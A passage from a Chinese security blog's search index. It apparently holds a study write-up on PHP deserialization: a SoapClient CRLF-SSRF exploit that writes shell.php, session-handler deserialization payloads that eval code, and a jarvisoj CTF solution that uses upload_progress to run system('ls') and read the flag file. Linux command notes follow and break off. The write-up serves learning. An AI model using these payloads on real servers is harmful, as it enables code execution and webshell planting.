&#x5373;&#x53EF;&#x628A;.htaccess&#x5220;&#x9664;&#xFF0C;&#x518D;&#x76F4;&#x63A5;&#x53BB;&#x8BBF;&#x95EE;&#x4E00;&#x53E5;&#x8BDD;&#x6728;&#x9A6C;&#x8FDE;&#x8681;&#x5251;&#x62FF;flag&#x3002;(&#x8FD9;&#x91CC;&#x7531;&#x4E8E;&#x9898;&#x76EE;&#x5DF2;&#x7ECF;&#x5173;&#x4E86;&#xFF0C;&#x81EA;&#x5DF1;&#x7684;&#x73AF;&#x5883;&#x603B;&#x662F;&#x51FA;&#x95EE;&#x9898;&#xFF0C;&#x5C31;&#x6CA1;&#x590D;&#x73B0;&#x6210;&#x529F;&#x3002;) &#x539F;&#x751F;&#x7C7B;&#x9B54;&#x6CD5;&#x51FD;&#x6570;(soapClient&#x7C7B;)&#x53C2;&#x8003;&#x8FD9;&#x4E00;&#x7BC7;&#xFF1A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x653B;&#x51FB;&#x9762;&#x62D3;&#x5C55;&#x63D0;&#x9AD8;&#x7BC7; SOAP&#x662F;webService&#x4E09;&#x8981;&#x7D20;&#xFF08;SOAP&#x3001;WSDL(WebServicesDescriptionLanguage)&#x3001;UDDI(UniversalDescriptionDiscovery andIntegration)&#xFF09;&#x4E4B;&#x4E00; WSDL &#x7528;&#x6765;&#x63CF;&#x8FF0;&#x5982;&#x4F55;&#x8BBF;&#x95EE;&#x5177;&#x4F53;&#x7684;&#x63A5;&#x53E3; UDDI&#x7528;&#x6765;&#x7BA1;&#x7406;&#xFF0C;&#x5206;&#x53D1;&#xFF0C;&#x67E5;&#x8BE2;webService SOAP&#xFF08;&#x7B80;&#x5355;&#x5BF9;&#x8C61;&#x8BBF;&#x95EE;&#x534F;&#x8BAE;&#xFF09;&#x662F;&#x8FDE;&#x63A5;&#x6216;Web&#x670D;&#x52A1;&#x6216;&#x5BA2;&#x6237;&#x7AEF;&#x548C;Web&#x670D;&#x52A1;&#x4E4B;&#x95F4;&#x7684;&#x63A5;&#x53E3;&#x3002; webService&#x76F8;&#x5F53;&#x4E8E; HTTP + XML SoapClient()&#x65B9;&#x6CD5; public SoapClient::SoapClient ( mixed $wsdl [, array $options ] ) &#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x662F;&#x7528;&#x6765;&#x6307;&#x660E;&#x662F;&#x5426;&#x662F;wsdl&#x6A21;&#x5F0F;&#xFF0C;&#x5982;&#x679C;&#x4E3A;null&#xFF0C;&#x90A3;&#x5C31;&#x662F;&#x975E;wsdl&#x6A21;&#x5F0F;&#xFF0C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x65F6;&#x5019;&#x4F1A;&#x5BF9;&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x6307;&#x660E;&#x7684;url&#x8FDB;&#x884C;soap&#x8BF7;&#x6C42;&#x3002; &#x7528;Soap&#x8FDB;&#x884C;SSRF&#x4E5F;&#x6709;&#x4E24;&#x4E2A;&#x9700;&#x8981;&#x6CE8;&#x610F;&#x7684;&#x70B9;&#xFF1A; Soap&#x4E0D;&#x662F;&#x9ED8;&#x8BA4;&#x5F00;&#x542F;&#x7684;&#xFF0C;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5F00;&#x542F; &#x9700;&#x8981;&#x89E6;&#x53D1;__call&#x65B9;&#x6CD5;&#x624D;&#x80FD;&#x8FDB;&#x884C;SSRF SOAP =&gt; CRLF =&gt; SSRF &#x6587;&#x7AE0;&#x5F53;&#x4E2D;&#x7684;exp.php&#xFF1A; 12345678910111213141516&lt;?php$target = &apos;http://127.0.0.1/test.php&apos;;$post_string = &apos;1=file_put_contents(&quot;shell.php&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;);&apos;;$headers = array( &apos;X-Forwarded-For: 127.0.0.1&apos;, &apos;Cookie: xxxx=1234&apos; );$b = new SoapClient(null,array(&apos;location&apos; =&gt; $target,&apos;user_agent&apos;=&gt;&apos;wupco^^Content-Type: application/x-www-form-urlencoded^^&apos;.join(&apos;^^&apos;,$headers).&apos;^^Content-Length: &apos;.(string)strlen($post_string).&apos;^^^^&apos;.$post_string,&apos;uri&apos; =&gt; &quot;aaab&quot;));$aaa = serialize($b);$aaa = str_replace(&apos;^^&apos;,&apos;%0d%0a&apos;,$aaa);$aaa = str_replace(&apos;&amp;&apos;,&apos;%26&apos;,$aaa);echo $aaa;$c=unserialize(urldecode($aaa));$c-&gt;ss();?&gt; test.php: 1234567&lt;?php if($_SERVER[&apos;REMOTE_ADDR&apos;]==&apos;127.0.0.1&apos;){ echo &apos;hi&apos;; @$a=$_POST[1]; @eval($a);} ?&gt; &#x8BBF;&#x95EE; http://127.0.0.1/exp.php &#x53EF;&#x5728;&#x76EE;&#x5F55;&#x4E0B;&#x5199;&#x5165;&#x4E00;&#x4E2A;shell.php&#x3002; Session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x53C2;&#x8003;&#x8FD9;&#x4E00;&#x7BC7;PHP&#x4E2D;SESSION&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x673A;&#x5236; PHP&#x4E2D;&#x7684;session&#x4FDD;&#x5B58;PHP.ini&#x6709;&#x4EE5;&#x4E0B;&#x914D;&#x7F6E;&#x9879;&#x7528;&#x4E8E;&#x63A7;&#x5236;session&#x6709;&#x5173;&#x7684;&#x8BBE;&#x7F6E;&#xFF1A; session.save_path=&quot;D:\\xampp\\tmp&quot; &#x8868;&#x660E;&#x6240;&#x6709;&#x7684;session&#x6587;&#x4EF6;&#x90FD;&#x662F;&#x5B58;&#x50A8;&#x5728;xampp/tmp&#x4E0B; session.save_handler=files &#x8868;&#x660E;session&#x662F;&#x4EE5;&#x6587;&#x4EF6;&#x7684;&#x65B9;&#x5F0F;&#x6765;&#x8FDB;&#x884C;&#x5B58;&#x50A8;&#x7684; session.auto_start=0 &#x8868;&#x660E;&#x9ED8;&#x8BA4;&#x4E0D;&#x542F;&#x52A8;session session.serialize_handler=php &#x8868;&#x660E;session&#x7684;&#x9ED8;&#x8BA4;&#x5E8F;&#x5217;&#x8BDD;&#x5F15;&#x64CE;&#x4F7F;&#x7528;&#x7684;&#x662F;php&#x5E8F;&#x5217;&#x8BDD;&#x5F15;&#x64CE; PHP&#x4E2D;&#x6709;&#x591A;&#x79CD;session&#x7684;&#x5E8F;&#x5217;&#x8BDD;&#x5F15;&#x64CE;&#xFF0C;&#x5F53;&#x6211;&#x8BBE;&#x7F6E;session&#x4E3A;$_SESSION[&quot;name&quot;] = &quot;Threezh1&quot;;&#x65F6;&#x3002;&#x4E0D;&#x540C;&#x7684;&#x5F15;&#x64CE;&#x4FDD;&#x5B58;&#x7684;session&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5982;&#x4E0B;&#xFF1A; php: name|s:8:&quot;Threezh1&quot;; &#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ASCII&#x5B57;&#x7B26;+&#x952E;&#x540D;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C; php_binary: \u0004names:8:&quot;Threezh1&quot;; &#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x952E;&#x540D;+&#x7AD6;&#x7EBF;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5904;&#x7406;&#x7684;&#x503C; php_serialize(php&gt;5.5.4): a:1:{s:4:&quot;name&quot;;s:8:&quot;Threezh1&quot;;} &#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C; &#x5207;&#x6362;&#x4E0D;&#x540C;&#x5F15;&#x64CE;&#x4F7F;&#x7528;&#x7684;&#x51FD;&#x6570;&#x4E3A;&#xFF1A;ini_set(&apos;session.serialize_handler&apos;, &apos;&#x9700;&#x8981;&#x8BBE;&#x7F6E;&#x7684;&#x5F15;&#x64CE;&apos;); 1234&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();// do something Session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x539F;&#x7406;&#xFF1A;&#x5982;&#x679C;&#x5728;PHP&#x5728;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x5B58;&#x50A8;&#x7684;$_SESSION&#x6570;&#x636E;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x5F15;&#x64CE;&#x548C;&#x5E8F;&#x5217;&#x5316;&#x4F7F;&#x7528;&#x7684;&#x5F15;&#x64CE;&#x4E0D;&#x4E00;&#x6837;&#xFF0C;&#x4F1A;&#x5BFC;&#x81F4;&#x6570;&#x636E;&#x65E0;&#x6CD5;&#x6B63;&#x786E;&#x7B2C;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x5982;&#x679C;session&#x503C;&#x53EF;&#x63A7;&#xFF0C;&#x5219;&#x53EF;&#x901A;&#x8FC7;&#x6784;&#x9020;&#x7279;&#x6B8A;&#x7684;session&#x503C;&#x5BFC;&#x81F4;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x3002; &#x6587;&#x7AE0;&#x4E2D;&#x6709;&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#xFF1A; test1.php 12345&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();$_SESSION[&quot;spoock&quot;]=$_GET[&quot;a&quot;];?&gt; test2.php 1234567891011121314&lt;?phpini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class lemon { var $hi; function __construct(){ $this-&gt;hi = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;hi); }}?&gt; &#x901A;&#x8FC7;&#x6E90;&#x7801;&#x53EF;&#x4EE5;&#x5F97;&#x77E5;&#xFF0C;test1&#x4E2D;&#x4F7F;&#x7528;&#x7684;session&#x89E3;&#x6790;&#x5F15;&#x64CE;&#x662F;php_serialize&#xFF0C;test2&#x4F7F;&#x7528;&#x7684;&#x662F;php&#x3002; &#x5E76;&#x4E14;&#x5728;test1&#x4E2D;&#xFF0C;SESSION[&quot;spoock&quot;]&#x7684;&#x503C;&#x662F;&#x53EF;&#x63A7;&#x7684;&#x3002; &#x8BBF;&#x95EE;&#xFF1A; http://localhost/test1.php?a=|O:5:%22lemon%22:1:{s:2:%22hi%22;s:16:%22echo%20%27Threezh1%27;%22;} a&#x53C2;&#x6570;&#x7684;&#x503C;&#x4E3A;&#x201C;|&#x201D; + &#x4E00;&#x4E2A;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x5BF9;&#x8C61;&#x3002; &#x518D;&#x8BBF;&#x95EE;&#xFF1A; http://localhost/test2.php &#x8FD4;&#x56DE;&#xFF1A; Threezh1 &#x53EF;&#x77E5;&#x6211;&#x4EEC;&#x5728;session&#x4E2D;&#x7684;&#x89E3;&#x6790;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5BF9;&#x6211;&#x4EEC;&#x7684;payload&#x8FDB;&#x884C;&#x4E86;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x3002;&#x4E3A;&#x4EC0;&#x4E48;&#x4F1A;&#x51FA;&#x73B0;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x5462;&#xFF1F; payload&#x7684;&#x6784;&#x9020;&#x5148;&#x770B;&#x4E24;&#x4E2A;&#x89E3;&#x6790;&#x5F15;&#x64CE;&#x5B58;&#x50A8;session&#x7684;&#x683C;&#x5F0F;&#xFF1A; php: name|s:8:&quot;Threezh1&quot;; &#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x952E;&#x540D;&#x7684;&#x957F;&#x5EA6;&#x5BF9;&#x5E94;&#x7684;ASCII&#x5B57;&#x7B26;+&#x952E;&#x540D;+&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C; php_serialize(php&gt;5.5.4): a:1:{s:4:&quot;name&quot;;s:8:&quot;Threezh1&quot;;} &#x5B58;&#x50A8;&#x65B9;&#x5F0F;&#x662F;&#xFF0C;&#x7ECF;&#x8FC7;serialize()&#x51FD;&#x6570;&#x5E8F;&#x5217;&#x5316;&#x5904;&#x7406;&#x7684;&#x503C; &#x601D;&#x8DEF;&#xFF1A; &#x56E0;&#x4E3A;&#x50A8;&#x5B58;session&#x7684;&#x9875;&#x9762;(test1)&#x4F7F;&#x7528;&#x7684;&#x662F;php_serialize&#x89E3;&#x6790;&#x5F15;&#x64CE;&#xFF0C;&#x5982;&#x679C;&#x6211;&#x4EEC;&#x628A;session&#x7684;&#x503C;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x201C;|&#x201D;&#xFF0C;&#x5728;test2&#x9875;&#x9762;&#x4E2D;&#x4F7F;&#x7528;php&#x89E3;&#x6790;&#x5F15;&#x64CE;&#x89E3;&#x6790;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;&#x5C31;&#x4F1A;&#x628A;&#x201C;|&#x201D;&#x524D;&#x9762;&#x7684;&#x503C;&#x4F5C;&#x4E3A;&#x4E00;&#x4E2A;session&#x952E;&#x540D;&#xFF0C;&#x5BF9;&#x201C;|&#x201D;&#x540E;&#x9762;&#x5C31;&#x4F1A;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x64CD;&#x4F5C;&#x3002; &#x201C;|&#x201D;&#x540E;&#x9762;&#x7684;&#x5E8F;&#x5217;&#x5316;&#x5BF9;&#x8C61;&#x751F;&#x6210;&#xFF1A; 123456789101112131415&lt;?phpclass lemon { var $hi; function __construct(){ $this-&gt;hi = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;hi); }}$a = new lemon();$a-&gt;hi = &quot;echo &apos;Threezh1&apos;;&quot;;echo serialize($a)?&gt; &#x4F46;&#x662F;&#x76F4;&#x63A5;&#x8FD9;&#x6837;&#x5229;&#x7528;&#x7684;&#x8BDD;&#xFF0C;&#x5C40;&#x9650;&#x6027;&#x8FD8;&#x662F;&#x592A;&#x5927;&#x4E86;&#x3002; &#x4F46;&#x5728;&#x6709;&#x8DA3;&#x7684;php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x603B;&#x7ED3;&#x4E2D;&#x4ECB;&#x7ECD;&#x4E86;&#x53E6;&#x4E00;&#x79CD;Session&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x6F0F;&#x6D1E;&#x7684;&#x5229;&#x7528;&#x65B9;&#x5F0F;&#x3002; &#x5F53;PHP&#x4E2D;session.upload_progress.enabled&#x6253;&#x5F00;&#x65F6;&#xFF0C;php&#x4F1A;&#x8BB0;&#x5F55;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x7684;&#x8FDB;&#x5EA6;&#xFF0C;&#x5728;&#x4E0A;&#x4F20;&#x65F6;&#x4F1A;&#x5C06;&#x5176;&#x4FE1;&#x606F;&#x4FDD;&#x5B58;&#x5728;$_SESSION&#x4E2D;&#x3002;&#x8BE6;&#x60C5;&#x3002; &#x6761;&#x4EF6;&#xFF1A; session.upload_progress.enabled = On (&#x662F;&#x5426;&#x542F;&#x7528;&#x4E0A;&#x4F20;&#x8FDB;&#x5EA6;&#x62A5;&#x544A;) session.upload_progress.cleanup = Off (&#x662F;&#x5426;&#x4E0A;&#x4F20;&#x5B8C;&#x6210;&#x4E4B;&#x540E;&#x5220;&#x9664;session&#x6587;&#x4EF6;) &#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#x8FDB;&#x5EA6;&#x7684;&#x62A5;&#x544A;&#x5C31;&#x4F1A;&#x4EE5;&#x5199;&#x5165;&#x5230;session&#x6587;&#x4EF6;&#x4E2D;&#xFF0C;&#x6240;&#x4EE5;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x8BBE;&#x7F6E;&#x4E00;&#x4E2A;&#x4E0E;session.upload_progress.name&#x540C;&#x540D;&#x7684;&#x53D8;&#x91CF;(&#x9ED8;&#x8BA4;&#x540D;&#x4E3A;PHP_SESSION_UPLOAD_PROGRESS)&#xFF0C;PHP&#x68C0;&#x6D4B;&#x5230;&#x8FD9;&#x79CD;&#x540C;&#x540D;&#x8BF7;&#x6C42;&#x4F1A;&#x5728;$_SESSION&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x6761;&#x6570;&#x636E;&#x3002;&#x6211;&#x4EEC;&#x5C31;&#x53EF;&#x4EE5;&#x63A7;&#x5236;&#x8FD9;&#x4E2A;&#x6570;&#x636E;&#x5185;&#x5BB9;&#x4E3A;&#x6211;&#x4EEC;&#x7684;&#x6076;&#x610F;payload&#x3002; &#x672C;&#x6253;&#x7B97;&#x590D;&#x73B0;&#xFF1A;&#x6709;&#x8DA3;&#x7684;php&#x53CD;&#x5E8F;&#x5217;&#x5316;&#x603B;&#x7ED3;,&#x4F46;&#x5728;&#x4F20;&#x9012;payload&#x7684;&#x65F6;&#x5019;&#xFF0C;payload&#x5982;&#x679C;&#x5B58;&#x5728;&#x201D;|&#x201D;&#x3002;session&#x5C31;&#x4F1A;&#x4E3A;&#x7A7A;&#xFF0C;&#x8FD8;&#x6CA1;&#x6709;&#x627E;&#x5230;&#x89E3;&#x51B3;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x5E08;&#x5085;&#x9047;&#x5230;&#x540C;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x8FD8;&#x671B;&#x5E08;&#x5085;&#x5E2E;&#x5FD9;&#x89E3;&#x7B54;&#x3002; jarvisoj-web-writeup PHPINFO&#x9898;&#x76EE;&#x5730;&#x5740;&#xFF1A;http://web.jarvisoj.com:32784/ 1234567891011121314151617181920212223242526&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{ public $mdzz; function __construct() { $this-&gt;mdzz = &apos;phpinfo();&apos;; } function __destruct() { eval($this-&gt;mdzz); }}if(isset($_GET[&apos;phpinfo&apos;])){ $m = new OowoO();}else{ highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt; &#x5F00;&#x5934;&#x5C06;session&#x7684;&#x89E3;&#x6790;&#x5F15;&#x64CE;&#x5B9A;&#x4E49;&#x4E3A;&#x4E86;php&#x3002; &#x8BBF;&#x95EE;&#xFF1A;http://web.jarvisoj.com:32784/index.php?phpinfo &#x53EF;&#x770B;&#x5230;session.upload_progress.enabled&#xFF0C;session.upload_progress.cleanup&#x90FD;&#x7B26;&#x5408;&#x6761;&#x4EF6;&#x3002; &#x4E8E;&#x662F;&#x6784;&#x9020;&#x4E00;&#x4E2A;upload.html 12345&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt; poc.php&#xFF1A; 123456789&lt;?phpclass OowoO{ public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &quot;print_r(scandir(__dir__));&quot;;echo serialize($a);?&gt; &#x751F;&#x6210;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x503C;&#x4E3A;&#xFF1A; O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:22:&quot;print_r(system(&apos;ls&apos;));&quot;;} &#x5728;&#x4E0A;&#x4F20;&#x7684;&#x65F6;&#x5019;&#x6293;&#x5305;&#xFF0C;&#x4FEE;&#x6539;&#x4E0A;&#x4F20;&#x7684;&#x5185;&#x5BB9;&#x4E3A;&#x5E8F;&#x5217;&#x5316;&#x7684;&#x503C;&#x524D;&#x52A0;&#x4E00;&#x4E2A;&#x201C;|&#x201D;&#x3002;&#x5373;&#x53EF;&#x904D;&#x5386;&#x76EE;&#x5F55;&#x3002; &#x518D;&#x4ECE;phpinfo&#x4E2D;&#x7684;SCRIPT_FILENAME&#x5B57;&#x6BB5;&#x5F97;&#x5230;&#x6839;&#x76EE;&#x5F55;&#x5730;&#x5740;&#xFF1A;/opt/lampp/htdocs/,&#x6784;&#x9020;&#x5F97;&#x5230;payload&#xFF1A; O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:88:&quot;print_r(file_get_contents(&apos;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&apos;));&quot;;} &#x5F97;&#x5230;flag&#xFF1A; &#x53C2;&#x8003; https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/ https://www.anquanke.com/post/id/159206 https://chybeta.github.io/2017/07/05/jarvisoj-web-writeup/#PHPINFO","link":"/2019/10/04/PHP反序列化进阶学习与总结/"},{"title":"Linux学习笔记","text":"&#x7B2C;&#x4E00;&#x7AE0;,&#x90E8;&#x7F72;&#x865A;&#x62DF;&#x73AF;&#x5883;&#x5B89;&#x88C5;Linux&#x7CFB;&#x7EDF;RPM(&#x7EA2;&#x5E3D;&#x8F6F;&#x4EF6;&#x5305;&#x7BA1;&#x7406;&#x5668;)&#x5E38;&#x7528;&#x547D;&#x4EE4;&#xFF1A; 123456&#x5B89;&#x88C5;&#x8F6F;&#x4EF6; rpm -ivh filename.rpm&#x5347;&#x7EA7;&#x8F6F;&#x4EF6; rpm -Uvh filename.rpm&#x5378;&#x8F7D;&#x8F6F;&#x4EF6; rpm -e filename.rpm&#x67E5;&#x8BE2;&#x8F6F;&#x4EF6;&#x63CF;&#x8FF0;&#x4FE1;&#x606F; rpm -qpi filename.rpm&#x5217;&#x51FA;&#x8F6F;&#x4EF6;&#x6587;&#x4EF6;&#x4FE1;&#x606F; rpm -qpi filename.rpm&#x67E5;&#x8BE2;&#x6587;&#x4EF6;&#x5C5E;&#x4E8E;&#x54EA;&#x4E2A;RPM rpm -qf filename.rpm Yum&#x8F6F;&#x4EF6;&#x4ED3;&#x5E93;&#x5E38;&#x7528;Yum&#x547D;&#x4EE4;&#xFF1A; 12345678910111213yum repolist all &#x5217;&#x51FA;&#x6240;&#x6709;&#x4ED3;&#x5E93;yum list all &#x5217;&#x51FA;&#x4ED3;&#x5E93;&#x4E2D;&#x6240;&#x6709;&#x8F6F;&#x4EF6;&#x5305;yum info &#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0; &#x67E5;&#x770B;&#x8F6F;&#x4EF6;&#x5305;&#x4FE1;&#x606F;yum install &#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0; &#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x5305;yum reinstall &#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0; &#x91CD;&#x65B0;&#x5B89;&#x88C5;&#x8F6F;&#x4EF6;&#x5305;yum update &#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0; &#x5347;&#x7EA7;&#x8F6F;&#x4EF6;&#x5305;yum remove &#x8F6F;&#x4EF6;&#x5305;&#x540D;&#x79F0; &#x79FB;&#x9664;&#x8F6F;&#x4EF6;&#x5305;yum clean all &#x79FB;&#x9664;&#x6240;&#x6709;&#x4ED3;&#x5E93;&#x7F13;&#x5B58;yum check-update &#x68C0;&#x67E5;&#x53EF;&#x66F4;&#x65B0;&#x7684;&#x8F6F;&#x4EF6;&#x5305;yum grouplist &#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x4E2D;&#x5DF2;&#x7ECF;&#x5B89;&#x88C5;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x7EC4;yum groupinstall &#x8F6F;&#x4EF6;&#x5305;&#x7EC4; &#x5B89;&#x88C5;&#x6307;&#x5B9A;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x7EC4;yum groupremove &#x8F6F;&#x4EF6;&#x5305;&#x7EC4; &#x79FB;&#x9664;&#x6307;&#x5B9A;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x7EC4;yum groupinfo &#x8F6F;&#x4EF6;&#x5305;&#x7EC4; &#x67E5;&#x8BE2;&#x6307;&#x5B9A;&#x7684;&#x8F6F;&#x4EF6;&#x5305;&#x7EC4;&#x4FE1;&#x606F; &#x7B2C;&#x4E8C;&#x7AE0;,&#x65B0;&#x624B;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x7684;Linux&#x547D;&#x4EE4;&#x5E38;&#x7528;&#x7CFB;&#x7EDF;&#x5DE5;&#x4F5C;&#x547D;&#x4EE4; 1, echo &#x547D;&#x4EE4; echo &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5728;&#x7EC8;&#x7AEF;&#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#x6216;&#x53D8;&#x91CF;&#x63D0;&#x53D6;&#x540E;&#x7684;&#x503C;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;echo [&#x5B57;&#x7B26;&#x4E32; | $&#x53D8;&#x91CF;]&#x201D;&#x3002; &#x8F93;&#x51FA;&#x5B57;&#x7B26;&#x4E32;&#xFF1A;echo Hello World!!! &#x63D0;&#x53D6;&#x53D8;&#x91CF;SHELL&#x7684;&#x503C;&#xFF1A;echo $SHELL 2, date &#x547D;&#x4EE4; date &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x53CA;&#x8BBE;&#x7F6E;&#x7CFB;&#x7EDF;&#x7684;&#x65F6;&#x95F4;&#x6216;&#x65E5;&#x671F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;date [&#x9009;&#x9879;] [+&#x6307;&#x5B9A;&#x7684;&#x683C;&#x5F0F;]&#x3002; date &#x547D;&#x4EE4;&#x4E2D;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#xFF1A; 123456%t &#x8DF3;&#x683C;[Tab&#x952E;]%H &#x5C0F;&#x65F6;&#xFF08;00&#xFF5E;23&#xFF09;%I &#x5C0F;&#x65F6;&#xFF08;00&#xFF5E;12&#xFF09;%M &#x5206;&#x949F;&#xFF08;00&#xFF5E;59&#xFF09;%S &#x79D2;&#xFF08;00&#xFF5E;59&#xFF09;%j &#x4ECA;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5929; &#x67E5;&#x770B;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x65F6;&#x95F4;&#xFF1A;date date &#x547D;&#x4EE4;&#x4E2D;&#x8F93;&#x5165;&#x4EE5;&#x201C;+&#x201D;&#x53F7;&#x5F00;&#x5934;&#x7684;&#x53C2;&#x6570;&#xFF0C;&#x5373;&#x53EF;&#x6309;&#x7167;&#x6307;&#x5B9A;&#x683C;&#x5F0F;&#x6765;&#x8F93;&#x51FA;&#x7CFB;&#x7EDF;&#x7684;&#x65F6;&#x95F4;&#x6216;&#x65E5;&#x671F; &#x6309;&#x7167;&#x201C;&#x5E74;-&#x6708;-&#x65E5; &#x5C0F;&#x65F6;:&#x5206;&#x949F;:&#x79D2;&#x201D;&#x7684;&#x683C;&#x5F0F;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x65F6;&#x95F4;&#xFF1A;date &quot;+%Y-%m-%d %H:%M:%S&quot; &#x5C06;&#x7CFB;&#x7EDF;&#x7684;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x8BBE;&#x7F6E;&#x4E3A; 2017 &#x5E74; 9 &#x6708; 1 &#x65E5; 8 &#x70B9; 30 &#x5206;&#x7684; date &#x547D;&#x4EE4;:date -s &quot;20170901 8:30:00&quot; &#x518D;&#x6B21;&#x4F7F;&#x7528; date &#x547D;&#x4EE4;&#x5E76;&#x6309;&#x7167;&#x9ED8;&#x8BA4;&#x7684;&#x683C;&#x5F0F;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7684;&#x7CFB;&#x7EDF;&#x65F6;&#x95F4;:date date &#x547D;&#x4EE4;&#x4E2D;&#x7684;&#x53C2;&#x6570;%j &#x53EF;&#x7528;&#x6765;&#x67E5;&#x770B;&#x4ECA;&#x5929;&#x662F;&#x5F53;&#x5E74;&#x4E2D;&#x7684;&#x7B2C;&#x51E0;&#x5929;&#x3002;&#x8FD9;&#x4E2A;&#x53C2;&#x6570;&#x80FD;&#x591F;&#x5F88;&#x597D;&#x5730;&#x533A;&#x5206;&#x5907;&#x4EFD;&#x65F6;&#x95F4;&#x7684;&#x65B0;&#x65E7;&#xFF0C;&#x5373;&#x6570;&#x5B57;&#x8D8A;&#x5927;&#xFF0C;&#x8D8A;&#x9760;&#x8FD1;&#x5F53;&#x524D;&#x65F6;&#x95F4;&#x3002;date &quot;+%j&quot; 3, reboot &#x547D;&#x4EE4; &#x91CD;&#x542F;&#x8BA1;&#x7B97;&#x673A; 4, poweroff &#x547D;&#x4EE4; &#x5173;&#x95ED;&#x7CFB;&#x7EDF; 5, wget &#x547D;&#x4EE4; wget 